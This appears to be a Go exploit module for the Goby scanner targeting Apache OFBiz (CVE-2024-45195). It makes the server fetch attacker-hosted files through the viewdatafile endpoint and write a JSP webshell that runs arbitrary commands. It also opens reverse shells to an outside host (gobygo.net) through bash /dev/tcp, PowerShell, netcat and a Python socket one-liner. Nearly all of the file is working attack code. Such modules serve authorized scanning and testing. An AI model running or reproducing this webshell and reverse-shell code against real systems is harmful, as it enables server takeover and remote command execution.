package exploits

import (
	"encoding/base64"
	"errors"
	"git.gobies.org/goby/goscanner/godclient"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
	"time"
	"unicode/utf16"
)

func init() {
	expJson := `{
    "Name": "Apache OFBiz /viewdatafile  Code Execution Vulnerability(CVE-2024-45195)",
    "Description": "<p>Apache OFBiz is an open-source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the enterprise's business processes.  </p><p>Apache OFBiz has a remote code execution vulnerability that allows a remote attacker to gain server privileges by controlling the request and writing a malicious file.</p>",
    "Product": "Apache_OFBiz",
    "Homepage": "http://ofbiz.apache.org/",
    "DisclosureDate": "2024-09-06",
    "PostTime": "2024-09-10",
    "Author": "202205566302@smail.xtu.edu.cn",
    "FofaQuery": "cert=\"Organizational Unit: Apache OFBiz\" || (body=\"www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\") || header=\"Set-Cookie: OFBiz.Visitor\" || banner=\"Set-Cookie: OFBiz.Visitor\"",
    "GobyQuery": "cert=\"Organizational Unit: Apache OFBiz\" || (body=\"www.ofbiz.org\" && body=\"/images/ofbiz_powered.gif\") || header=\"Set-Cookie: OFBiz.Visitor\" || banner=\"Set-Cookie: OFBiz.Visitor\"",
    "Level": "2",
    "Impact": "<p>Apache OFBiz has a remote code execution vulnerability that allows a remote attacker to gain server privileges by controlling the request and writing a malicious file.</p>",
    "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls. </p><p>2. If not necessary, prohibit public network access to the system.</p>",
    "References": [
        "https://github.com/vulhub/vulhub/blob/master/ofbiz/CVE-2024-45195/README.zh-cn.md"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "cmd,reverse",
            "show": ""
        },
        {
            "name": "cmd",
            "type": "input",
            "value": "whoami",
            "show": "attackType=cmd"
        },
        {
            "name": "reverse",
            "type": "select",
            "value": "ByBash,ByPowershell",
            "show": "attackType=reverse"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Code Execution"
    ],
    "VulType": [
        "Code Execution"
    ],
    "CVEIDs": [
        "CVE-2024-45195"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "8.0",
    "Translation": {
        "CN": {
            "Name": "Apache OFBiz /viewdatafile 代码执行漏洞（CVE-2024-45195）",
            "Product": "Apache_OFBiz",
            "Description": "<p>Apache OFBiz是一个开源企业资源规划（ERP）系统。它提供了一套企业应用程序，集成并自动化企业的许多业务流程。&nbsp;</p><p>Apache OFBiz 存在远程代码执行漏洞，远程攻击者可通过控制请求从而写入恶意文件获取服务器权限。<br></p>",
            "Recommendation": "<p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。&nbsp;</p><p>2、如非必要，禁止公网访问该系统。<br></p>",
            "Impact": "<p>Apache OFBiz 存在远程代码执行漏洞，远程攻击者可通过控制请求从而写入恶意文件获取服务器权限。<br></p>",
            "VulType": [
                "代码执行"
            ],
            "Tags": [
                "代码执行"
            ]
        },
        "EN": {
            "Name": "Apache OFBiz /viewdatafile  Code Execution Vulnerability(CVE-2024-45195)",
            "Product": "Apache_OFBiz",
            "Description": "<p>Apache OFBiz is an open-source enterprise resource planning (ERP) system. It provides a suite of enterprise applications that integrate and automate many of the enterprise's business processes.&nbsp;&nbsp;</p><p>Apache OFBiz has a remote code execution vulnerability that allows a remote attacker to gain server privileges by controlling the request and writing a malicious file.</p>",
            "Recommendation": "<p>1. Set access policies and whitelist access through security devices such as firewalls.&nbsp;</p><p>2. If not necessary, prohibit public network access to the system.<br></p>",
            "Impact": "<p>Apache OFBiz has a remote code execution vulnerability that allows a remote attacker to gain server privileges by controlling the request and writing a malicious file.<br></p>",
            "VulType": [
                "Code Execution"
            ],
            "Tags": [
                "Code Execution"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "9952"
}`
	setPayloadRequestHashafsuhfbuasnchbascbghasvgjgbavjcshandfgwedafds := func(hostInfo *httpclient.FixUrl, command string) (string, string, error) {
		//请注意：command字段是原始的命令，如果漏洞利用需要对命令进行编码，则需在此处编码

		//请注意：ok值为，true代表命令执行成功，false代表命令执行失败

		//请注意：vulURL 字段为检测后显示的风险路径，示例值为：/path/to/vulable.jsp
		vulURL := "/webtools/control/forgotPassword/viewdatafile"
		//
		creatxml := `<data-files xsi:noNamespaceSchemaLocation="http://ofbiz.apache.org/dtds/datafiles.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
  <data-file name="rce" separator-style="fixed-length" type-code="text" start-line="0" encoding-type="UTF-8">
      <record name="rceentry" limit="many">
          <field name="jsp" type="String" length="490" position="0"></field>
      </record>
  </data-file>
</data-files>`
		creatcsv := `<%@ page import="java.util.Base64"%><%String a=request.getParameter("cmd");if(a!=null&&!a.isEmpty()){String b=new String(Base64.getDecoder().decode(a));if(b!=null){Process c=Runtime.getRuntime().exec(b);java.util.Scanner d=new java.util.Scanner(c.getInputStream()).useDelimiter("\\A");String e=d.hasNext()?d.next():"";String f=Base64.getEncoder().encodeToString(e.getBytes());out.println(f);java.io.File g=new java.io.File(application.getRealPath(request.getServletPath()));g.delete();}}%>,`
		filename := goutils.RandomHexString(5) + ".jsp"

		err := godclient.HostFile(goutils.RandomHexString(5)+".xml", creatxml, func(url string) error {
			creatxmlUrl := url
			err := godclient.HostFile(goutils.RandomHexString(5)+".csv", creatcsv, func(url string) error {
				creatcsvUrl := url
				requestConfig := httpclient.NewPostRequestConfig(vulURL)
				requestConfig.VerifyTls = false
				requestConfig.FollowRedirect = false
				requestConfig.Timeout = 10
				requestConfig.Header.Store("Content-Type", "application/x-www-form-urlencoded")
				requestConfig.Data = `DATAFILE_LOCATION=` + creatcsvUrl + `&DATAFILE_SAVE=./applications/accounting/webapp/ap/error/` + filename + `&DATAFILE_IS_URL=true&DEFINITION_LOCATION=` + creatxmlUrl + `&DEFINITION_IS_URL=true&DEFINITION_NAME=rce`
				resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
				if err != nil || resp.StatusCode != 200 {
					err = errors.New("failed to RCE")
					return err
				}
				return nil
			})
			if err != nil {
				return err
			}
			return nil
		})
		if err != nil {
			return "", vulURL, err
		}

		//base64编码command
		command = base64.StdEncoding.EncodeToString([]byte(command))
		requestConfig := httpclient.NewGetRequestConfig("/ap/error/" + filename + "?cmd=" + command)
		requestConfig.VerifyTls = false
		requestConfig.FollowRedirect = false
		requestConfig.Timeout = 10
		resp, err := httpclient.DoHttpRequest(hostInfo, requestConfig)
		if err != nil || resp.StatusCode != 200 {
			err = errors.New("failed to RCE")
			return "", vulURL, err
		}
		re, err := regexp.Compile(`((.|\n)*?)\n,`)
		//检查是否有匹配到内容
		if !re.MatchString(resp.RawBody) {
			return "", vulURL, errors.New("failed to RCE")
		}
		match := re.FindStringSubmatch(resp.RawBody)
		//commandResult为base64解码后的match[1],commandResult变为字符串
		tmpres, err := base64.StdEncoding.DecodeString(match[1])
		commandResult := ""
		if err != nil {
			commandResult = match[1]
		} else {
			commandResult = string(tmpres)
		}
		return commandResult, vulURL, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		//poc验证函数
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashafsuhfbuasnchbascbghasvgjgbavjcshandfgwedafds

			text := goutils.RandomHexString(16)
			pocCommand := `echo ` + text
			pocRuselt, pocUrl, err := runPayload(hostInfo, pocCommand)
			if err != nil {
				return false
			}
			if strings.Contains(pocRuselt, text) {
				ss.VulURL = hostInfo.FixedHostInfo + pocUrl
				return true
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			//setPayloadRequestHash函数会赋值给runPayload，请自行重命名setPayloadRequestHash函数
			runPayload := setPayloadRequestHashafsuhfbuasnchbascbghasvgjgbavjcshandfgwedafds

			setReverseWaitting := func(expResult *jsonvul.ExploitResult, waitSessionCh chan string) {
				select {
				case webConsleID := <-waitSessionCh:
					if u, err := url.Parse(webConsleID); err == nil {
						expResult.Success = true
						expResult.OutputType = "html"
						sid := strings.Join(u.Query()["id"], "")
						expResult.Output += `<br/> <a href="goby://sessions/view?sid=` + sid + `&key=` + godclient.GetKey() + `">open shell</a>`
					} else {
						expResult.Success = false
						expResult.Output = "reverse shell fail"
					}
				case <-time.After(time.Second * 25):
				}
			}

			setReverseRequest := func(reverseType string) (string, chan string, error) {
				bypython := func(port string) string {
					return "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"gobygo.net\"," + port + "));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"bash\")'"
				}
				typeList := map[string]func(string) string{
					"ByBash":             godclient.ReverseTCPByBash,
					"ByBashBase64":       godclient.ReverseTCPByBash,
					"ByPowershell":       godclient.ReverseTCPByPowershell,
					"ByPowershellBase64": godclient.ReverseTCPByPowershell,
					"BySh":               godclient.ReverseTCPBySh,
					"ByNcBsd":            godclient.ReverseTCPByNcBsd,
					"Bypython":           bypython,
				}
				if revserTypeNew := typeList[reverseType]; revserTypeNew == nil {
					return "", nil, errors.New("vaild exsploit")
				}
				waitSessionCh := make(chan string)

				if strings.Contains(reverseType, "ByPowershell") {
					if rp, err := godclient.WaitSession("reverse_windows", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByPowershellBase64" {
							utf16Bytes := utf16.Encode([]rune(strings.TrimLeft(command, "powershell ")))
							bytes := make([]byte, len(utf16Bytes)*2)
							for i, v := range utf16Bytes {
								bytes[i*2] = byte(v)
								bytes[i*2+1] = byte(v >> 8)
							}
							command = "powershell -e " + base64.StdEncoding.EncodeToString(bytes)
						}
						return command, waitSessionCh, nil
					}
				} else {
					if rp, err := godclient.WaitSession("reverse_linux_none", waitSessionCh); err != nil || len(rp) >= 0 {
						command := typeList[reverseType](rp)
						if reverseType == "ByBash" {
							reRequest := regexp.MustCompile("(/dev/tcp/((.|\n)*?)/[0-9]+)")
							getserver := reRequest.FindStringSubmatch(command)
							command = "/bin/bash -c bash${IFS}-i${IFS}>&" + getserver[1] + "<&1"
						}
						if reverseType == "ByBashBase64" {
							command = "bash -c '{echo," + base64.StdEncoding.EncodeToString([]byte(command)) + "}|{base64,-d}|{bash,-i}'"
						}
						return command, waitSessionCh, nil
					}
				}
				return "", waitSessionCh, errors.New("gain command fail")
			}

			attackType := goutils.B2S(ss.Params["attackType"])
			switch attackType {
			case "cmd":
				//配置命令
				command := goutils.B2S(ss.Params["cmd"])
				Result, _, err := runPayload(expResult.HostInfo, command)

				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
					return expResult
				}

				if len(Result) > 0 {
					expResult.Success = true
					expResult.Output = Result
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			case "reverse":
				//配置反弹shell的类型
				reversetype := goutils.B2S(ss.Params["reverse"])

				if command, waitSessionCh, err := setReverseRequest(reversetype); command != "" {
					go runPayload(expResult.HostInfo, command)
					setReverseWaitting(expResult, waitSessionCh)
				} else {
					expResult.Success = false
					expResult.Output = err.Error()
				}
			default:
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
